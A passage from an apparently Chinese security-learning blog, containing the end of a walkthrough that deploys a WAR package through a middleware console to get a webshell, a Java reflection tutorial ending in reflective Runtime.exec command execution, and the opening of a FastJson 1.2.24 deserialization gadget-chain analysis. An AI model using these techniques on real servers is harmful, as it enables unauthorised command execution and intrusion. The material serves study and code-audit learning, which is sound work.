<p><a href="https://image.3001.net/images/20181216/1544955476_5c162654ad096.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955476_5c162654ad096.png!small" alt="img"></a></p>
<p>点击上传文件 — 进入文件上传界面，选择要上传的 war 包。</p>
<p><a href="https://image.3001.net/images/20181216/1544955485_5c16265d47acf.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955485_5c16265d47acf.png!small" alt="img"></a></p>
<p>进入下一步，选择对应的 war 包进行部署，下一步下一步直至完成。</p>
<p><a href="https://image.3001.net/images/20181216/1544955495_5c16266778cf9.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955495_5c16266778cf9.png!small" alt="img"></a></p>
<p><a href="https://image.3001.net/images/20181216/1544955518_5c16267e4cdda.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955518_5c16267e4cdda.png!small" alt="img"></a></p>
<p><a href="https://image.3001.net/images/20181216/1544955523_5c1626831e3b3.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955523_5c1626831e3b3.png!small" alt="img"></a></p>
<p>点击激活更改。</p>
<p><a href="https://image.3001.net/images/20181216/1544955531_5c16268b6846b.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955531_5c16268b6846b.png!small" alt="img"></a></p>
<p>启动上传的 war 包所生成的服务。</p>
<p><a href="https://image.3001.net/images/20181216/1544955539_5c16269393d67.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955539_5c16269393d67.png!small" alt="img"></a></p>
<p>拿到 webshell。</p>
<p><a href="https://image.3001.net/images/20181216/1544955547_5c16269badc78.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955547_5c16269badc78.png!small" alt="img"></a></p>
<p><strong>3、 漏洞修复</strong></p>
<p>防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。</p>
]]></content>
      <categories>
        <category>中间件漏洞学习</category>
      </categories>
  </entry>
  <entry>
    <title>java学习--反射机制</title>
    <url>/2020/11/25/java-xue-xi-fan-she-ji-zhi/</url>
    <content><![CDATA[<h2 id="Java学习–java反射机制"><a href="#Java学习–java反射机制" class="headerlink" title="Java学习–java反射机制"></a>Java学习–java反射机制</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        反射是Java中一种动态(运行时)，通过反射可以在java动态运行时，对于任意一个类，<strong>对象可以通过反射获取到他的类，类可以通过反射拿到所有方法(包括私有)</strong>，动态获取信息，以及动态调用对象的方法的功能称为java语言的反射机制。</p>
<h3 id="反射的具体使用步骤"><a href="#反射的具体使用步骤" class="headerlink" title="反射的具体使用步骤"></a>反射的具体使用步骤</h3><p>在调用<code>Java</code>反射机制，主要步骤包括：</p>
<ul>
<li>获取 目标类型的<code>Class</code>对象.</li>
<li>通过 <code>Class</code> 对象分别获取<code>Constructor</code>类对象、<code>Method</code>类对象 &amp; <code>Field</code> 类对象.</li>
<li>通过 <code>Constructor</code>类对象、<code>Method</code>类对象 &amp; <code>Field</code>类对象分别获取类的构造函数、方法&amp;属性的具体信息，并进行后续操作.</li>
</ul>
<h4 id="反射获取类的class对象"><a href="#反射获取类的class对象" class="headerlink" title="反射获取类的class对象"></a>反射获取类的class对象</h4><p>要想使用反射，我们首先需要获得代操作的类所对应的Clas对象。</p>
<p><strong>1.常用的获取Class对象有四种方法：</strong></p>
<ul>
<li><p>使用Class类的静态方法</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.String"</span>)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用类的.class语法</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Class</span> clz = <span class="keyword">String</span>.<span class="keyword">class</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用对象的getClass()方法</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">String</span> <span class="built_in">str</span> = <span class="keyword">new</span> <span class="keyword">String</span>(<span class="string">"Hello"</span>);</span><br><span class="line">Class clz = <span class="built_in">str</span>.getClass();</span><br></pre></td></tr></table></figure>
</li>
<li><p>Type语法</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Class</span>&lt;?&gt; classType = <span class="type">Boolean</span>.<span class="keyword">TYPE</span>; </span><br><span class="line">    <span class="keyword">System</span>.<span class="keyword">out</span>.println(classType);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="反射创建类对象"><a href="#反射创建类对象" class="headerlink" title="反射创建类对象"></a>反射创建类对象</h4><p>常用两种方法:</p>
<ul>
<li><p>通过 Class 对象的 newInstance() 方法，<strong>只能使用默认的无参数构造方法。</strong></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">Class clz = pen.<span class="keyword">class</span>;</span><br><span class="line">Pen pen = (pen)clz.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过 Constructor 对象的 newInstance() 方法,<strong>可以选择特定的构造方法。</strong></p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Class</span> clz = pen.<span class="keyword">class</span>;</span><br><span class="line"><span class="function"><span class="keyword">Constructor</span> <span class="title">constructor</span> = <span class="title">clz</span>.<span class="title">getConstructor</span><span class="params">()</span>;</span></span><br><span class="line">Pen pen = (Pen)<span class="function"><span class="keyword">constructor</span>.<span class="title">newInstance</span><span class="params">()</span>;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="反射获取并调用类的构造函数-Constructor"><a href="#反射获取并调用类的构造函数-Constructor" class="headerlink" title="反射获取并调用类的构造函数(Constructor)"></a>反射获取并调用类的构造函数(Constructor)</h4><h5 id="1-获取所有公有构造函数"><a href="#1-获取所有公有构造函数" class="headerlink" title="1.获取所有公有构造函数"></a>1.获取所有公有构造函数</h5><figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Constructor</span>[] <span class="title">conArray</span> = <span class="title">clazz</span>.<span class="title">getConstructors</span><span class="params">()</span>;</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="function"><span class="keyword">Constructor</span> <span class="title">c</span> :</span> conArray)<span class="comment">&#123;</span></span><br><span class="line"><span class="comment">		System.out.println(c);</span></span><br></pre></td></tr></table></figure>

<h5 id="2-获取所有的构造函数-包括：私有、受保护、默认、公有"><a href="#2-获取所有的构造函数-包括：私有、受保护、默认、公有" class="headerlink" title="2.获取所有的构造函数(包括：私有、受保护、默认、公有)"></a>2.获取所有的构造函数(包括：私有、受保护、默认、公有)</h5><figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">conArray = clazz.getDeclaredConstructors();</span><br><span class="line">		<span class="keyword">for</span>(<span class="function"><span class="keyword">Constructor</span> <span class="title">c</span> :</span> conArray)<span class="comment">&#123;</span></span><br><span class="line"><span class="comment">			System.out.println(c);</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="3-获取公有、无参的构造函数"><a href="#3-获取公有、无参的构造函数" class="headerlink" title="3.获取公有、无参的构造函数"></a>3.获取公有、无参的构造函数</h5><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">Constructor con = clazz.get<span class="constructor">Constructor(<span class="params">null</span>)</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"con = "</span> + con);</span><br><span class="line">Object obj = con.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br></pre></td></tr></table></figure>

<h4 id="反射获取并调用类的成员方法-Method"><a href="#反射获取并调用类的成员方法-Method" class="headerlink" title="反射获取并调用类的成员方法(Method)"></a>反射获取并调用类的成员方法(Method)</h4><h5 id="1-反射有参数方法"><a href="#1-反射有参数方法" class="headerlink" title="1.反射有参数方法"></a>1.反射有参数方法</h5><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">Class a = Class.forName(<span class="string">"org.xiaopan.fanshe.Pen"</span>);</span><br><span class="line">Pen pen =(Pen) a.<span class="keyword">new</span><span class="type">Instance</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">String</span>[] b(<span class="keyword">String</span>[] b)</span><br><span class="line">Method m = a.getMethod(<span class="string">"b"</span>,<span class="keyword">String</span>[].class);<span class="comment">//获取方法，需要指定要获取的方法名</span></span><br><span class="line"><span class="keyword">String</span>[] strs = (<span class="keyword">String</span>[]) m.invoke(pen, <span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="keyword">new</span> <span class="type">String</span>[]&#123;<span class="string">"str1"</span>,<span class="string">"str2"</span>,<span class="string">"str3"</span>&#125;&#125;); <span class="comment">//使用new Object[]&#123;&#125;形式传入</span></span><br></pre></td></tr></table></figure>

<h5 id="2-反射无参数方法"><a href="#2-反射无参数方法" class="headerlink" title="2.反射无参数方法"></a>2.反射无参数方法</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Class</span> a = <span class="keyword">Class</span>.forName("org.xiaopan.fanshe.Pen");</span><br><span class="line">Pen pen =(Pen) a.newInstance();</span><br><span class="line"><span class="built_in">public</span> <span class="type">void</span> a()</span><br><span class="line"><span class="keyword">Method</span> m = a.getMethod("a", <span class="keyword">null</span>);</span><br><span class="line">m.invoke(pen,<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<h5 id="3-反射静态方法"><a href="#3-反射静态方法" class="headerlink" title="3.反射静态方法"></a>3.反射静态方法</h5><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Class</span> a = <span class="keyword">Class</span>.forName(<span class="string">"org.fanshe.test.Pen"</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> c()</span><br><span class="line">Method m = a.getMethod(<span class="string">"c"</span>);</span><br><span class="line">m.invoke(<span class="keyword">null</span>); <span class="comment">//静态方法，直接调用，类对象传入null即可。</span></span><br></pre></td></tr></table></figure>

<h4 id="反射获取类的成员属性-amp-赋值-Field"><a href="#反射获取类的成员属性-amp-赋值-Field" class="headerlink" title="反射获取类的成员属性&amp;赋值(Field)"></a>反射获取类的成员属性&amp;赋值(Field)</h4><h5 id="1-反射公共属性"><a href="#1-反射公共属性" class="headerlink" title="1.反射公共属性"></a>1.反射公共属性</h5><p>通过Class对象的etFields() 方法获取 Class 类的属性。只能获取公有属性。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Pen</span>.</span></span><span class="keyword">class</span>;</span><br><span class="line">Field<span class="literal">[]</span> fields = clz.get<span class="constructor">Fields()</span>;</span><br><span class="line">for (Field field : fields) &#123;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(field.get<span class="constructor">Name()</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-反射私有属性"><a href="#2-反射私有属性" class="headerlink" title="2.反射私有属性"></a>2.反射私有属性</h5><p>通过Class 对象的 getDeclaredFields() 方法则可以获取包括私有属性在内的所有属性。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Pen</span>.</span></span><span class="keyword">class</span>;</span><br><span class="line">Field<span class="literal">[]</span> fields = clz.get<span class="constructor">DeclaredFields()</span>;</span><br><span class="line">for (Field field : fields) &#123;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(field.get<span class="constructor">Name()</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="反射调用Runtime-getRuntime执行本地代码"><a href="#反射调用Runtime-getRuntime执行本地代码" class="headerlink" title="反射调用Runtime,getRuntime执行本地代码"></a>反射调用Runtime,getRuntime执行本地代码</h4><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类对象</span></span><br><span class="line">Class runtimeClass1 = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.Runtime"</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">Constructor constructor = runtimeClass1.get<span class="constructor">DeclaredConstructor()</span>;</span><br><span class="line">constructor.set<span class="constructor">Accessible(<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">Object runtimeInstance = constructor.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">Method runtimeMethod = runtimeClass1.get<span class="constructor">Method(<span class="string">"exec"</span>, String.<span class="params">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">InputStream <span class="keyword">in</span> = process.get<span class="constructor">InputStream()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="module-access"><span class="module"><span class="identifier">IOUtils</span>.</span></span><span class="keyword">to</span><span class="constructor">String(<span class="params">in</span>, <span class="string">"UTF-8"</span>)</span>);</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    Java反射机制是Java动态性中最为重要的体现，利用反射机制我们可以轻松的实现Java类的动态调用。Java的大部分框架都是采用了反射机制来实现的(如:<code>Spring MVC</code>、<code>ORM框架</code>等)，Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用。</p>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.freebuf.com/articles/web/242967.html" target="_blank" rel="noopener">Java代码审计基础之反射 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/pange1991/article/details/81175350" target="_blank" rel="noopener">(4条消息) Java反射详解_潘建南的博客-CSDN博客</a></p>
<p><a href="https://juejin.cn/post/6844904005294882830#heading-11" target="_blank" rel="noopener">Java 反射由浅入深 | 进阶必备 (juejin.cn)</a></p>
<p><a href="https://javasec.org/javase/Reflection/Reflection.html" target="_blank" rel="noopener">Java反射机制 · 攻击Java Web应用-[Java Web安全] (javasec.org)</a></p>
]]></content>
      <categories>
        <category>java代码审计学习</category>
      </categories>
  </entry>
  <entry>
    <title>java安全--FastJson 1.2.22-1.2.24漏洞分析</title>
    <url>/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/</url>
    <content><![CDATA[<h2 id="java安全–FastJson-1-2-22-1-2-24漏洞分析"><a href="#java安全–FastJson-1-2-22-1-2-24漏洞分析" class="headerlink" title="java安全–FastJson 1.2.22-1.2.24漏洞分析"></a>java安全–FastJson 1.2.22-1.2.24漏洞分析</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换。最近几年fastjson爆出了不少漏洞，但源头还是fastjson1.2.24爆出的反序列化漏洞,本文记录学习调试该漏洞的过程。</p>
<h3 id="初探fastjosn反序列化"><a href="#初探fastjosn反序列化" class="headerlink" title="初探fastjosn反序列化"></a>初探fastjosn反序列化</h3><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>Fastjson在进行反序列化操作时，并没有使用默认的readObject()，而是自己实现了一套反序列化机制。我们通过操作操作属性的setter getter方法结合一些特殊类从而实现任意命令执行。</p>
<h4 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h4><p>我们可以首先构造一个User类:</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(<span class="keyword">String</span> name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用fastjson来对构造的类进行序列化:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">String serializedStr = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span><span class="keyword">to</span><span class="constructor">JSONString(<span class="params">user1</span>)</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"serializedStr="</span>+serializedStr);</span><br></pre></td></tr></table></figure>

<p>fastjson可以使用三种形式进行反序列化:</p>
<ul>
<li>通过parse方法进行反序列化，<strong>parse在解析过程中会调用目标类中的特定setter方法和getter方法</strong></li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">Object obj1 = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse(serializedStr);</span><br><span class="line">      <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parse反序列化对象名称:"</span>+obj1.get<span class="constructor">Class()</span>.get<span class="constructor">Name()</span>);</span><br><span class="line">      <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parse反序列化："</span>+obj1);</span><br></pre></td></tr></table></figure>

<ul>
<li>通过parseObject反序列化，不需要指定类,返回JSONObject。parseObject只是对parse进行了简单的封装。</li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">Object obj2 = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse<span class="constructor">Object(<span class="params">serializedStr</span>)</span>;</span><br><span class="line">   <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj2.get<span class="constructor">Class()</span>.get<span class="constructor">Name()</span>);</span><br><span class="line">   <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parseObject反序列化:"</span>+obj2);</span><br></pre></td></tr></table></figure>

<ul>
<li>通过parseObject({},class),指定类，返回一个相应的类对象。</li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">Object obj3 = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse<span class="constructor">Object(<span class="params">serializedStr</span>,User.<span class="params">class</span>)</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj3.get<span class="constructor">Class()</span>.get<span class="constructor">Name()</span>);</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parseObject反序列化:"</span>+obj3);</span><br></pre></td></tr></table></figure>

<p>最后的结果如下:</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228204357.png" alt></p>
<h5 id="三个反序列化方法的区别"><a href="#三个反序列化方法的区别" class="headerlink" title="三个反序列化方法的区别"></a>三个反序列化方法的区别</h5><p>关于parse (String text) 、parseObject(String text)、 parseObject(String text, Class<T> clazz)三个方法，我们进行一个测试:</T></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">package com.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> FastJsonTest &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> String <span class="type">name</span>;</span><br><span class="line">    <span class="built_in">public</span> String age;</span><br><span class="line">    <span class="built_in">public</span> FastJsonTest() throws IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> <span class="type">void</span> setName(String test) &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("name setter called");</span><br><span class="line">        this.name = test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> String getName() &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("name getter called");</span><br><span class="line">        <span class="keyword">return</span> this.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> String setAge(String test) &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("Age setter called");</span><br><span class="line">        this.name = test;</span><br><span class="line">        <span class="keyword">return</span> this.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> String getAge()&#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("age getter called");</span><br><span class="line">        <span class="keyword">return</span> this.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args) &#123;</span><br><span class="line">        <span class="keyword">Object</span> obj = <span class="type">JSON</span>.parse("&#123;\"@<span class="keyword">type</span>\":\"com.fastjson.FastJsonTest\",\"<span class="type">name</span>\":\"thisisname\", \"age\":\"thisisage\"&#125;");</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(obj);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">Object</span> obj2 = <span class="type">JSON</span>.parseObject("&#123;\"@<span class="keyword">type</span>\":\"com.fastjson.FastJsonTest\",\"<span class="type">name</span>\":\"thisisname\", \"age\":\"thisisage\"&#125;");</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(obj2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">Object</span> obj3 = <span class="type">JSON</span>.parseObject("&#123;\"@<span class="keyword">type</span>\":\"com.fastjson.FastJsonTest\",\"<span class="type">name</span>\":\"thisisname\", \"age\":\"thisisage\"&#125;",FastJsonTest.<span class="keyword">class</span>);</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(obj3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行，得到的结果如图:</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228215030.png" alt></p>
<p>通过上面的结果。我们可以知道:</p>
<ul>
<li><p>使用JSON.parse(jsonstr)和JSON.parseObject(jsonstr, FastJsonTest.class)两种方式返回的结果相同:<strong>构造方法+Json字符串指定属性的setter()+特殊的getter()</strong></p>
</li>
<li><p>JSON.parseObject(jsonstr)会调用目标类中所有的getter方法，包括不存在属性和私有属性的getter()。<strong>原因是在调用JSON.parseObject(jsonstr)时会多执行JSON.toJSON()方法,JSON.toJSON()会将目标类中所有getter方法记录下来。</strong></p>
</li>
</ul>
<p>什么样getter可以被调用呢?</p>
<p>在JavaBeanInfo类中可以找到：</p>
<img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ截图20210301202051.png">

<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length<span class="literal">()</span> &gt;= <span class="number">4</span><span class="operator"> &amp;&amp; </span>!<span class="module-access"><span class="module"><span class="identifier">Modifier</span>.</span></span>is<span class="constructor">Static(<span class="params">method</span>.<span class="params">getModifiers</span>()</span>)<span class="operator"> &amp;&amp; </span>methodName.starts<span class="constructor">With(<span class="string">"get"</span>)</span><span class="operator"> &amp;&amp; </span><span class="module-access"><span class="module"><span class="identifier">Character</span>.</span></span>is<span class="constructor">UpperCase(<span class="params">methodName</span>.<span class="params">charAt</span>(3)</span>)<span class="operator"> &amp;&amp; </span><span class="keyword">method</span>.get<span class="constructor">ParameterTypes()</span>.length<span class="operator"> == </span><span class="number">0</span><span class="operator"> &amp;&amp; </span>(<span class="module-access"><span class="module"><span class="identifier">Collection</span>.</span></span><span class="keyword">class</span>.is<span class="constructor">AssignableFrom(<span class="params">method</span>.<span class="params">getReturnType</span>()</span>)<span class="operator"> || </span><span class="module-access"><span class="module"><span class="identifier">Map</span>.</span></span><span class="keyword">class</span>.is<span class="constructor">AssignableFrom(<span class="params">method</span>.<span class="params">getReturnType</span>()</span>)<span class="operator"> || </span><span class="module-access"><span class="module"><span class="identifier">AtomicBoolean</span>.</span></span><span class="keyword">class</span><span class="operator"> == </span><span class="keyword">method</span>.get<span class="constructor">ReturnType()</span><span class="operator"> || </span><span class="module-access"><span class="module"><span class="identifier">AtomicInteger</span>.</span></span><span class="keyword">class</span><span class="operator"> == </span><span class="keyword">method</span>.get<span class="constructor">ReturnType()</span><span class="operator"> || </span><span class="module-access"><span class="module"><span class="identifier">AtomicLong</span>.</span></span><span class="keyword">class</span><span class="operator"> == </span><span class="keyword">method</span>.get<span class="constructor">ReturnType()</span>)) &#123;</span><br></pre></td></tr></table></figure>

<p>总结下来有以下六个条件:</p>
<ul>
<li>方法名需要长于4</li>
<li>不是静态方法</li>
<li>以get字符串开头，且第四个字符需要是大写字母</li>
<li>方法不能有参数传入</li>
<li>继承自Collection || Map || AtomicBoolean || AtomicInteger ||AtomicLong</li>
<li>此getter不能有setter方法</li>
</ul>
<h4 id="Type-关键"><a href="#Type-关键" class="headerlink" title="@Type(关键)"></a>@Type(关键)</h4><p>fastjson通过@Type可以指定反序列化任意类,之后会自动调用类中属性特定的set和get方法。造成反序列化漏洞正是由于fastjson的这个特性。</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228210948.png" alt></p>
<p>我们这里通过@type指定类，成功获取到了对应的数据。</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228211209.png" alt></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​    上面我们通过对fastjson反序列化三种方式的学习可以知道。@type关键词会加载任意类，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。也就是说，当我们找到一个类中的getter方法满足调用的条件,并且存在可利用点，就构成了一条攻击链。</p>
<h3 id="TemplatesImpl利用链-lt-1-2-24"><a href="#TemplatesImpl利用链-lt-1-2-24" class="headerlink" title="TemplatesImpl利用链(&lt;=1.2.24)"></a>TemplatesImpl利用链(&lt;=1.2.24)</h3><h4 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h4><h5 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h5><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类中getOutputProperties()方法</p>
<h5 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h5><ul>
<li>服务端使用parseObject时,必须是<code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></li>
<li>服务端使用parse()时,需要<code>JSON.parse(text1,Feature.SupportNonPublicField);</code></li>
</ul>
<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p><strong>我们首先找到这条链子最终的漏洞利用点，然后进行逆向回溯找到漏洞点，之后在通过动态调试正向跟一下解析过程</strong></p>
<p>首先找到TemplatesImpl.getTransletInstance方法:</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228220743.png" alt></p>
<p>可以看到红框中的使用了newInstance( )方法进行了实例化操作，然后找到获取_class与_transletIndex值的defineTransletClasses()方法，跟进方法内:</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228221015.png" alt></p>
<p>找到<code>_bytecodes</code>变量,可以看到这个变量是TemplatesImpl类的成员变量，跟进类内部看一下:</p>
<p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301203755.png" alt></p>
